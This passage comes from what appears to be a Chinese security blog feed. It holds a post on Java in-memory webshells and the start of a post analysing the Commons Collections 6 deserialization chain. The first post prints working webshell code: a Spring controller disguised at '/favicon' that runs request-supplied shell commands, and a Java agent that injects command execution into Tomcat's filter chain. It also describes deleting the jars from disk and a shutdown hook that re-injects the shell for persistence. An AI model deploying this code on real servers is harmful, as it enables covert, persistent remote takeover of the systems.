     <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;code&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (code != <span class="literal">null</span>) &#123;</span><br><span class="line">            java.lang.Runtime.getRuntime().exec(code);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//            response.sendError(404);</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="controller"><a href="#controller" class="headerlink" title="controller"></a>controller</h2><p>不需要强制使用 <code>@RequestMapping</code> 注解定义 URL 地址和 HTTP 方法，其余两种手动注册 controller 的方法都必须要在 controller 中使用@RequestMapping 注解 。</p>
<p><font color="red">除此之外，将 Webshell 的代码逻辑写在主要的 Controller 方法中即可</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> me.landgrey;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SSOLogin</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/favicon&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">login</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">arg0</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;code&quot;</span>);</span><br><span class="line">            <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">            <span class="keyword">if</span> (arg0 != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">o</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                java.lang.ProcessBuilder p;</span><br><span class="line">                <span class="keyword">if</span>(System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>))&#123;</span><br><span class="line">                    p = <span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, arg0&#125;);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    p = <span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, arg0&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">                java.util.<span class="type">Scanner</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(p.start().getInputStream()).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                o = c.hasNext() ? c.next(): o;</span><br><span class="line">                c.close();</span><br><span class="line">                writer.write(o);</span><br><span class="line">                writer.flush();</span><br><span class="line">                writer.close();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                response.sendError(<span class="number">404</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Java-agent型"><a href="#Java-agent型" class="headerlink" title="Java agent型"></a>Java agent型</h1><p>通过 <code>java.lang.instrument</code> 实现的工具我们称之为 Java Agent ，Java Agent 能够在不影响正常编译的情况下来修改字节码，即动态修改已加载或者未加载的类，包括类的属性、方法</p>
<p><code>Instrumentation</code> 是 JVMTIAgent（JVM Tool Interface Agent）的一部分，Java agent通过这个类和目标 JVM 进行交互，从而达到修改数据的效果。在 Instrumentation 中增加了名叫 Transformer 的 Class 文件转换器，转换器可以改变二进制流的数据，可以对未加载的类进行拦截，同时可对已加载的类进行重新拦截，所以根据这个特性我们能够实现动态修改字节码</p>
<ul>
<li><code>addTransformer</code> 方法来用于注册 Transformer，所以我们可以通过编写 <code>ClassFileTransformer</code> 接口的实现类来注册我们自己的转换器</li>
<li><code>getAllLoadedClasses</code> 方法能列出所有已加载的 Class，我们可以通过遍历 Class 数组来寻找我们需要重定义的 class</li>
<li><code>retransformClasses</code> 方法能对已加载的 class 进行重新定义，也就是说如果我们的目标类已经被加载的话，我们可以调用该函数，来重新触发这个Transformer的拦截，以此达到对已加载的类进行字节码修改的效果</li>
</ul>
<h2 id="确定关键类"><a href="#确定关键类" class="headerlink" title="确定关键类"></a>确定关键类</h2><p>想要实现这样一种效果：访问web服务器上的任意一个url，无论这个url是静态资源还是jsp文件，无论这个url是原生servlet还是某个struts action，甚至无论这个url是否真的存在，只要我们的请求传递给tomcat，tomcat就能相应我们的指令。</p>
<p>为了达到这个目的，需要找一个特殊的类，这个类要尽可能在http请求调用栈的上方，又不能与具体的URL有耦合，而且还能接受客户端request中的数据。经过分析，发现<code>org.apache.catalina.core.ApplicationFilterChain类</code>的<code>internalDoFilter方法</code>最符合我们的要求</p>
<h2 id="WebShell"><a href="#WebShell" class="headerlink" title="WebShell"></a>WebShell</h2><p>整个植入流程：</p>
<ul>
<li><p>将inject.jar和agent.jar上传至目标Web Server任意目录下</p>
</li>
<li><p>以tomcat进程启动的OS用户执行java –jar inject.ja</p>
</li>
<li><p>inject.jar会通过一个循环遍历查找Web Server上的JVM进程，并把agent.jar注入进JVM进程中，直到注入成功后，inject.jar才会退出</p>
</li>
<li><p>注入成功后，agent.jar执行agentmain方法，该方法主要做以下几件事情：</p>
<ul>
<li><p>遍历所有已经加载的类，查找“org.apache.catalina.core.ApplicationFilterChain”，并对该类的internalDoFilter方法进行修改</p>
</li>
<li><p>修改完之后，把磁盘上的inject.jar和agent.jar读进tomcat内存中</p>
</li>
<li><p>对memShell做初始访问。为什么要做一次初始化访问呢？因为我们下一步要从磁盘上删掉agent.jar和inject.jar，在删除之前如果没有访问过memShell的话，memShell相关的一些类就不会加载进内存，这样后续我们在访问memShell的时候就会报ClassNotFound异常。有两种方法初始化类，第一是挨个把需要的类手动加载一次，第二是模拟做一次初始化访问，memShell采用的后者<br>  删除磁盘上的inject.jar和agent.jar。当Web Server是Linux系统的时候，正常删除文件即可。当Web Server是Windows系统的时候，由于Windows具有文件锁定机制，当一个文件被其他程序占用时，这个文件是处于锁定状态不可删除的，inject.jar正在被JVM所占用。要删除这个jar包，需要先打开该进程，遍历该进程的文件句柄，通过DuplicateHandle来巧妙的关闭文件句柄，然后再执行删除，我把这个查找句柄、关闭句柄的操作写进了一个exe中，memShell判断WebServer是Windows平台时，会先释放这个exe文件来关闭句柄，再删除agent.jar</p>
</li>
</ul>
</li>
<li><p>当JVM关闭时，会首先执行我们注册的ShutdownHook：</p>
<ul>
<li>把第4步中我们读进内存的inject.jar和agent.jar写入JVM临时目录</li>
<li>执行java -jar inject.jar，此后过程便又回到上述第3步中，形成一个闭环结构</li>
</ul>
</li>
</ul>
<h2 id="premain"><a href="#premain" class="headerlink" title="premain"></a>premain</h2><p>premain方法会在执行main方法前调用，在运行main方法前会去加载-javaagent指定的jar包里面的Premain-Class类中的premain方法。</p>
<p>也就是在程序执行前，修改字节码，利用起来不现实，但还是可以讲一下。</p>
<p>所以要实现的三个条件：</p>
<ol>
<li>Premain-Class 指定的那个类必须实现 premain() 方法</li>
<li>jar包中的MANIFEST.MF 文件必须指定 Premain-Class 项</li>
<li>启动Java程序的时候添加-javaagent(Instrumentation API实现方式)或-agentpath&#x2F;-agentlib(JVMTI的实现方式)参数。</li>
</ol>
<p>实现一下上面的条件，首先是创建一个类，来实现 premain 的这个方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        System.out.println(agentArgs);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;premain method is invoked!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来是要在mainfest.mf文件中添加内容：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Manifest-Version: <span class="number">1.0</span></span><br><span class="line">Can-Redefine-Classes: <span class="literal">true</span></span><br><span class="line">Can-Retransform-Classes: <span class="literal">true</span></span><br><span class="line">Premain-Class: DemoTest</span><br><span class="line"><span class="comment">//这里要有一个换行符</span></span><br></pre></td></tr></table></figure>

<p>利用 javac 将 java 文件编译成 class 之后，利用 jar 命令打包，生成我们的 agent.jar</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">javac DemoTest.java</span><br><span class="line">jar cvfm agent.jar mainfest.mf DemoTest.class</span><br></pre></td></tr></table></figure>

<p>按照以上步骤我们便可成功生成 agent.jar，再来建一个demo测试类，接下来有两种方法，一种是再生成一个demo.jar文件然后使用java -javaagent去执行，另一种是在idea中配置写入<code>-javaagent参数，-javaagent:out\hello.jar</code></p>
<h2 id="agentmain"><a href="#agentmain" class="headerlink" title="agentmain"></a>agentmain</h2><p>要实现的条件:</p>
<ul>
<li>必须要实现 agentmain 方法</li>
<li>Jar 文件清单中必须要含有 Premain-Class 属性</li>
</ul>
<p>在 Java JDK6 以后实现启动后加载 Instrument 的是 Attach api。存在于 <code>com.sun.tools.attach</code> 里面有两个重要的类一个是<code>VirtualMachin</code>e，一个是<code>VirtualMachineDescriptor</code></p>
<p>就是在程序运行中，修改字节码。</p>
<p>编写 <code>agentmain.java</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">agentmain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation ins)</span> &#123;</span><br><span class="line">        ins.addTransformer(<span class="keyword">new</span> <span class="title class_">DefineTransformer</span>(),<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编写 DefineTransformer.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DefineTransformer</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">        System.out.println(className);</span><br><span class="line">        <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>创建 jar 文件清单 agentmain.mf，这里我们需要修改已经被JVM加载过的类的字节码，所以需要设置在agentmain.mf中添加Can-Retransform-Classes: true和Can-Redefine-Classes: true。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Can-Redefine-Classes: true</span><br><span class="line">Can-Retransform-Classes: true</span><br><span class="line">Agent-Class: agentmain</span><br></pre></td></tr></table></figure>

<p>分别对上面的 java 文件进行编译，然后利用命令行进行打包:<code>jar cvfm agentmain.jar agentmain.mf agentmain.class DefineTransformer.class</code></p>
<p>生成agentmain.jar后，编写一个测试类，这里需要把jdk lib目录中的tools.jar添加进当前工程的Libraries中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">agentmainDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;agentmain.jar的路径&quot;</span>;</span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class="line">        <span class="keyword">for</span> (VirtualMachineDescriptor v:list)&#123;</span><br><span class="line">            System.out.println(v.displayName());</span><br><span class="line">            <span class="keyword">if</span> (v.displayName().contains(<span class="string">&quot;AgentMainDemo&quot;</span>))&#123;</span><br><span class="line">                <span class="comment">// 将 jvm 虚拟机的 pid 号传入 attach 来进行远程连接</span></span><br><span class="line">                <span class="type">VirtualMachine</span> <span class="variable">vm</span> <span class="operator">=</span> VirtualMachine.attach(v.id());</span><br><span class="line">                <span class="comment">// 将我们的 agent.jar 发送给虚拟机 </span></span><br><span class="line">                vm.loadAgent(path);</span><br><span class="line">                vm.detach();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行后<code>agentmain.jar</code>中的东西就会被成功调用，因为是通过tools.jar提供 <code>VirtualMachine</code>的attach api，而jdk 默认有 tools.jar，jre 默认没有，如果是mac的话可以从jdk中直接找到 VirtualMachine 类，windows需要手工去Java jdk的lib目录下将该包add as library添加进去。</p>
<h2 id="实现内存马"><a href="#实现内存马" class="headerlink" title="实现内存马"></a>实现内存马</h2><p>这里先找到我们要注入的类，前面思路也有提到，这里要注入到<br><code>org.apache.catalina.core.ApplicationFilterChain#doFilter</code>，这个类其实在filter中也有提到，它有ServletRequest和ServletResponse两个参数，里面封装了请求的request和response，所以在这里拦截的话，它一定会执行，能控制所有的请求和响应，并且不影响正常业务。大体实现的思路就是，生成MyAgent.jar，然后编写java利用代码来使其加载进去</p>
<p>(网上挺多通过改cc链)</p>
<p>编写AgentMain.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AgentMain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ClassName</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation ins)</span> &#123;</span><br><span class="line">        ins.addTransformer(<span class="keyword">new</span> <span class="title class_">DefineTransformer</span>(),<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 获取所有已加载的类</span></span><br><span class="line">        Class[] classes = ins.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class clas:classes)&#123;</span><br><span class="line">            <span class="keyword">if</span> (clas.getName().equals(ClassName))&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    <span class="comment">// 对类进行重新定义</span></span><br><span class="line">                    ins.retransformClasses(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;clas&#125;);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编写DefineTransformer.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DefineTransformer</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ClassName</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) &#123;</span><br><span class="line">        className = className.replace(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (className.equals(ClassName))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Find the Inject Class: &quot;</span> + ClassName);</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">CtClass</span> <span class="variable">c</span> <span class="operator">=</span> pool.getCtClass(className);</span><br><span class="line">                <span class="type">CtMethod</span> <span class="variable">m</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;doFilter&quot;</span>);</span><br><span class="line">                m.insertBefore(<span class="string">&quot;javax.servlet.http.HttpServletRequest req =  request;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;javax.servlet.http.HttpServletResponse res = response;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;java.lang.String cmd = request.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;if (cmd != null)&#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    try &#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        String line;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        StringBuilder sb = new StringBuilder(\&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        while ((line=reader.readLine()) != null)&#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;            sb.append(line).append(\&quot;\\n\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        &#125;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        response.getOutputStream().print(sb.toString());\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        response.getOutputStream().flush();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        response.getOutputStream().close();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    &#125; catch (Exception e)&#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        e.printStackTrace();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">                <span class="type">byte</span>[] bytes = c.toBytecode();</span><br><span class="line">                <span class="comment">// 将 c 从 classpool 中删除以释放内存</span></span><br><span class="line">                c.detach();</span><br><span class="line">                <span class="keyword">return</span> bytes;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>打包生成agent.jar包，然后利用cc链。</p>
<h1 id="Tomcat-1"><a href="#Tomcat-1" class="headerlink" title="Tomcat"></a>Tomcat</h1><p>参考<a href="https://xz.aliyun.com/t/7388">基于tomcat的内存 Webshell 无文件攻击技术</a></p>
<p>试图做到tomcat下的通杀Webshell<br>具体文章讲的很清楚了</p>
<h1 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h1><p>参考<a href="https://www.cnblogs.com/unicodeSec/p/13162792.html">weblogic 无文件webshell的技术研究</a></p>
<p>类似于tomcat场景</p>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a><center>结语</center></h1><p>看到这里的同学，如果以前打过AWD就会发现，内存马有点像PHP的不死马，虽然类型多，但主要目的就是，<font color="red"><strong>通过不同的方法将马写到了一个有生命周期的东西中</strong></font>（目前Spring内存马、shiro内存马、Agent内存马主流的实现方式，可以配合CC链子），如果对map不太了解的同学可以看我<a href="https://nuxl1r.github.io/JAVA%E5%AE%89%E5%85%A8/CC6%E6%94%BB%E5%87%BB%E9%93%BE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/">上篇文章</a>。</p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>webshell</tag>
      </tags>
  </entry>
  <entry>
    <title>CC6攻击链分析与复现</title>
    <url>/JAVA%E5%AE%89%E5%85%A8/CC6%E6%94%BB%E5%87%BB%E9%93%BE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>为什么不从CC1写？大同小异懂一个基本都懂了,而且CC6利用也更多，生成的payload也更短</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown96074895_p11.jpg"></p>
<span id="more"></span>

<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>CC6全称为<code>Commons Collections6</code> （Apache Commons Collections）是一个用来处理集合<code>Collection</code>的开源工具包，比如你可以用来将一个对象拷贝多份并存放到一个Bag对象中（这个看来没有多大用处），得到两个集合里相同的元素，删除一个集合里的元素并返回删除的元素，还有除了通过一个集合里的key得到value外，还可以通过value 得到key，也就是说这个集合里的value是唯一的，另外还可以将一个集合里的key和value值对调，得到一个集合里的某一key之后的另一个 key值。</p>
<ul>
<li><p>要复现的话下载<code>Collections3.x</code>系列版本即可 ，<a href="https://commons.apache.org/proper/commons-collections/download_collections.cgi" title="官方链接">官方链接</a>。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_aTfFRN4LZR.png"></p>
</li>
</ul>
<h1 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h1><p>在分析CC6利用链之前，得先知道<code>TransformedMap</code> 的运行原理。</p>
<p><code>TransformedMap</code>⽤于对Java标准数据结构Map做⼀个修饰，被修饰过的Map在添加新的元素时，将可以执⾏⼀个回调。可以通过下⾯这⾏代码对<code>innerMap</code>进⾏修饰，传出的<code>outerMap</code>即是修饰后的Map：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, keyTransformer,valueTransformer);</span><br></pre></td></tr></table></figure>

<p>其中，<code>keyTransformer</code>是处理新元素的Key的回调，<code>valueTransformer</code>是处理新元素的value的回调。</p>
<p>这⾥所说的 “回调” ，并不是传统意义上的⼀个回调函数，⽽是⼀个实现了<code>Transformer</code>接⼝的类。</p>
<h2 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h2><p>Transformer是⼀个接⼝，它只有⼀个待实现的⽅法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line">     <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>TransformedMap在转换Map的新元素时，就会调⽤transform⽅法，这个过程就类似在调⽤⼀个 “回调函数”，这个回调的参数是原始对象。</p>
<h2 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h2><p><code>ConstantTransformer</code>是实现了Transformer接⼝的⼀个类，它的过程就是在构造函数的时候传⼊⼀个<br>对象，并在transform⽅法将这个对象再返回：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line"> <span class="built_in">super</span>();</span><br><span class="line"> iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line"> <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以他的作⽤其实就是包装任意⼀个对象，在执⾏回调时返回这个对象，进⽽⽅便后续操作。</p>
<p>InvokerTransformer</p>
<p>InvokerTransformer是实现了Transformer接⼝的⼀个类，这个类可以⽤来执⾏任意⽅法，这也是反序<br>列化能执⾏任意代码的关键。</p>
<p>在实例化这个InvokerTransformer时，需要传⼊三个参数，<strong>第⼀个参数是待执⾏的⽅法名</strong>，<strong>第⼆个参数<br>是这个函数的参数列表的参数类型</strong>，<strong>第三个参数是传给这个函数的参数列表</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line"> <span class="built_in">super</span>();</span><br><span class="line"> iMethodName = methodName;</span><br><span class="line"> iParamTypes = paramTypes;</span><br><span class="line"> iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>后⾯的回调transform⽅法，就是执⾏了input对象的iMethodName⽅法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line"> <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">try</span> &#123;</span><br><span class="line">   <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">   <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">   <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line"> &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">   <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> +iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line"> &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">   <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> +iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line"> &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line"> <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> +iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

